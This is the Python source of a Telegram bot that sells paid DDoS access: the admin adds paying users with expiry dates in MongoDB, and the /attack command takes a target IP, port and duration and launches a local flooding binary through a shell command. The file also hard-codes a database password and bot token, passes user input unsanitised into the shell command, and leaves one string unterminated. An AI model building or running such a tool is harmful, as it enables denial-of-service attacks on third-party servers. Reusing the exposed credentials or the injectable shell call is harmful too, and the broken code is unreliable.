import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Database Configuration
MONGO_URI = 'mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['TEST']
users_collection = db['PAID']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7799579745:AAEBe-b42-FYeqegBVQs7KYJ8celqUUowvI
ADMIN_USER_ID = 7619631321 # Replace with your admin user ID
ADMIN_USERNAME = 'DeathNot pro hack 👿'  # Replace with your admin's Telegram username (without @)

# Customizable messages
OWNER_NAME = '@Asgafsfs99_bot'  # Change this to the owner's name
WELCOME_MESSAGE = (
    f"🤗 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐁𝐎𝐓⚡\n\n"
    f"𝐎𝐖𝐍𝐄𝐑 💯 {OWNER_NAME} 🔥\n\n"
    "🌏 𝐖𝐄'𝐑𝐄 𝐏𝐑𝐎𝐕𝐈𝐃𝐈𝐍𝐆 𝐀𝐑𝐄 𝐖𝐎𝐑𝐋𝐃 𝐁𝐄𝐒𝐓 𝐇𝐀𝐂𝐊𝐒 🌏\n"
    f"𝗣𝗔𝗜𝗗 𝗗𝗗𝗢𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗘 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 - @Vip_Ddos_07 ⭐\n"
    f"𝘿𝙊𝙉'𝙏 𝙁𝙊𝙍𝙂𝙊𝙏 𝙏𝙊 𝙅𝙊𝙄𝙉 𝙊𝙐𝙍 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 💦 @MOINVIPDDOS\n"
)

active_attacks = {}  # To keep track of active attacks (user_id -> attack process)

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*🚫 Who goes there?* 🛑\n\n*This is a restricted area! Only authorized warriors may pass.* 💥\n*You need to be granted permission first! ⚔️* 𝗚𝗔𝗥𝗘𝗘𝗕 𝗕𝗨𝗬 𝗞𝗔𝗥 𝗙𝗥𝗘𝗘 𝗠𝗘 𝗞𝗨𝗖𝗛 𝗡𝗔𝗛𝗜 𝗠𝗜𝗟𝗧𝗔 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 @Vip_Ddos_07",
            parse_mode='Markdown'
        )
        return

    # Send the customizable welcome message and rules
    await context.bot.send_message(chat_id=chat_id, text=WELCOME_MESSAGE, parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*💀 𝗔𝗕𝗘 𝗡𝗢𝗢𝗕 𝗢𝗪𝗡𝗘𝗥 𝗛𝗜 𝗔𝗗𝗗 𝗞𝗔𝗥 𝗦𝗔𝗞𝗧𝗔 𝗛𝗔𝗜🤬 ⚡ 𝙎𝘾𝙍𝙄𝙋𝙏 𝙆𝙃𝘼𝙍𝙄𝘿 𝘼𝙐𝙍 𝙆𝙃𝙐𝘿 𝙆𝘼 𝘽𝙊𝙏 𝘽𝘼𝙉𝘼 𝙉𝘼𝙃𝙄 𝙏𝙊𝙃 𝘽𝙃𝘼𝙂 𝙅𝘼 🇧 🇺 🇾 ~ @Vip_Ddos_07 𝙋𝙍𝙄𝘾𝙀 - 200000000 𝘼𝘽 𝙉𝙄𝙆𝘼𝙇",
            parse_mode='Markdown'
        )
        return

    if len(context.args) != 2:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Error: You must give a valid user ID and duration!*\n*Usage: /add <user_id> <time>*",
            parse_mode='Markdown'
        )
        return

    target_user_id = int(context.args[0])
    time_input = context.args[1]  # The second argument is the time input (e.g., '2m', '5d')

    # Extract numeric value and unit from the input
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 86400  # Convert days to seconds
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 60  # Convert minutes to seconds
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)

    # Add or update user in the database
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=f"*🎉 {target_user_id} has been added as a warrior for {time_input}!*",
        parse_mode='Markdown'
    )

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚡ Only the chosen one (admin) can banish warriors!*\n*You need admin powers to remove them.*",
            parse_mode='Markdown'
        )
        return

    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Error: You must provide a valid user ID to remove!*",
            parse_mode='Markdown'
        )
        return

    target_user_id = int(context.args[0])
    
    # Remove user from the database
    users_collection.delete_one({"user_id": target_user_id})

    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=f"*🚫 {target_user_id} 𝗚𝗔𝗬𝗔 𝗡𝗢𝗢𝗕 𝗚𝗔𝗥𝗔𝗕 𝗦𝗔𝗟𝗔 💦",
        parse_mode='Markdown'
    )

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not await is_user_allowed(user_id):
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*💢 𝐔𝐍𝐀𝐔𝐓𝐇𝐎𝐑𝐈𝐒𝐄𝐃 𝐀𝐂𝐂𝐄𝐒𝐒 💢\n\n🦍 𝙊𝙤𝙥𝙨! 𝙄𝙩 𝙨𝙚𝙚𝙢𝙨 𝙡𝙞𝙠𝙚 𝙮𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙥𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙚 /𝙖𝙩𝙩𝙖𝙘𝙠 𝙘𝙤𝙢𝙢𝙖𝙣𝙙. 𝙏𝙤 𝙜𝙖𝙞𝙣 𝙖𝙘𝙘𝙚𝙨𝙨 𝙖𝙣𝙙 𝙪𝙣𝙡𝙚𝙖𝙨𝙝 𝙩𝙝𝙚 𝙥𝙤𝙬𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠𝙨, 𝙮𝙤𝙪 𝙘𝙖𝙣: 🦍\n\n👉 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙣 𝘼𝙙𝙢𝙞𝙣 𝙤𝙧 𝙩𝙝𝙚 𝙊𝙬𝙣𝙚𝙧 𝙛𝙤𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡\n🌟 𝘽𝙚𝙘𝙤𝙢𝙚 𝙖 𝙥𝙧𝙤𝙪𝙙 𝙨𝙪𝙥𝙥𝙤𝙧𝙩𝙚𝙧 𝙖𝙣𝙙 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡\n💬 𝘾𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 𝙖𝙣 𝙖𝙙𝙢𝙞𝙣 𝙣𝙤𝙬 𝙖𝙣𝙙 𝙡𝙚𝙫𝙚𝙡 𝙪𝙥 𝙮𝙤𝙪𝙧 𝙘𝙖𝙥𝙖𝙗𝙞𝙡𝙞𝙩𝙞𝙚𝙨!\n\n🚀 𝙍𝙚𝙖𝙙𝙮 𝙩𝙤 𝙨𝙪𝙥𝙚𝙧𝙘𝙝𝙖𝙧𝙜𝙚 𝙮𝙤𝙪𝙧 𝙚𝙭𝙥𝙚𝙧𝙞𝙚𝙣𝙘𝙚? 𝙏𝙖𝙠𝙚 𝙖𝙘𝙩𝙞𝙤𝙣 𝙖𝙣𝙙 𝙜𝙚𝙩 𝙧𝙚𝙖𝙙𝙮 𝙛𝙤𝙧 𝙥𝙤𝙬𝙚𝙧𝙛𝙪𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨! ⚔️🇧 🇺 🇾 - @Vip_Ddos_07",
            parse_mode='Markdown'
        )
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*🌟 𝐄𝐍𝐓𝐄𝐑 𝐓𝐇𝐄 :--> <𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄> ⚡\n\n💀 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 ✨ -> @Vip_Ddos_07 🎯!*",
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    await context.bot.send_message(
        chat_id=chat_id, 
        text=(
            f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗚 𝗚𝗔𝗬𝗔 𝗦𝗜𝗥 𝗝𝗜 🌽\n"
            f"*🛶𝙏𝘼𝙍𝙂𝙀𝙏: {ip}:{port}*\n"
            f"*⌛𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉 𝙇𝙊𝘾𝙆𝙀𝘿: {duration} seconds*\n"
            f"*🌪️ 𝙒𝘼𝙄𝙏 𝙆𝘼𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝙆𝘼 ⚠️🛎️*"
            f"*𝙈𝙀𝙏𝙃𝙊𝘿 - 𝙐𝙇𝙏𝙍𝘼 𝙋𝘼𝙄𝘿 𝙐𝙎𝙀𝙍 👹🖤💢*\n"
        ), 
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 𝐒𝐓𝐎𝐏 𝐀𝐓𝐓𝐀𝐂𝐊 🛑", callback_data="stop_attack")],
            [InlineKeyboardButton("♠️𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐀𝐃𝐌𝐈𝐍♠️", url=f"tg://user?id={ADMIN_USER_ID}")]
        ])
    )

    # Start the attack as an async task and store the process to handle stopping it
    attack_task = asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
    active_attacks[user_id] = attack_task

async def stop_attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id not in active_attacks:
        await update.callback_query.answer("You don't have an active attack to stop!")
        return

    # Stop the active attack
    attack_task = active_attacks.pop(user_id)
    attack_task.cancel()

    await update.callback_query.answer("The attack has been halted! 🛑")

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Moin {ip} {port} {duration} 200",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"*⚠️ Error during the attack: {str(e)}*",
            parse_mode='Markdown'
        )

    finally:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚔ 𝙈𝙄𝙎𝙎𝙄𝙊𝙉 𝘼𝘾𝘾𝙊𝙈𝙋𝙇𝙄𝙎𝙃𝙀𝘿.... ⚔\n\n⏰\n\n𝙊𝙥𝙚𝙧𝙖𝙩𝙞𝙤𝙣 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚.🌟\n\n𝘿𝙀𝘼𝙍 𝙐𝙎𝙀𝙍𝙎 𝙒𝙀 𝙑𝘼𝙇𝙐𝙀 𝙊𝙁 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙎𝙊𝙊 𝙋𝙇𝙀𝘼𝙎𝙀 𝙎𝙀𝙉𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆𝙎 ✅ 𝙄𝙉 𝘾𝙃𝘼𝙏 🇯 🇴 🇮 🇳  🇨 🇭 🇦 🇳 🇳 🇪 🇱  @MOINVIPDDOS☺️*",
            parse_mode='Markdown'
        )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CallbackQueryHandler(stop_attack, pattern="stop_attack"))

    application.run_polling()

if __name__ == '__main__':
    main()
    